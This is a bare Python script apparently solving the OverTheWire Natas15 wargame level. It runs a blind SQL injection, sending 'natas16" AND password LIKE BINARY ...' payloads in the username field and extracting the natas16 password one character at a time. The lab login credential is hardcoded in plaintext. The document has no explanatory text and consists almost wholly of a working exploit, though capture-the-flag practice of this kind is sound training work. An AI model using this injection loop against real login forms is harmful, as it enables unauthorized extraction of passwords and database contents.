import requests

url = "http://natas15.natas.labs.overthewire.org/"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"  # Replace with the actual password for Natas15

# Characters to test (alphanumeric + some special characters)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Placeholder for the extracted password
extracted_password = ""

# Loop through each character position
for i in range(1, 33):  # Assuming the password is 32 characters long
    for char in charset:
        # Construct the payload
        payload = f'natas16" AND password LIKE BINARY "{extracted_password}{char}%" -- '
        data = {"username": payload}

        # Send the request
        response = requests.post(url, auth=(username, password), data=data)

        # Check if the character is correct
        if "This user exists" in response.text:
            extracted_password += char
            print(f"Extracted: {extracted_password}")
            break

print(f"Final password: {extracted_password}")
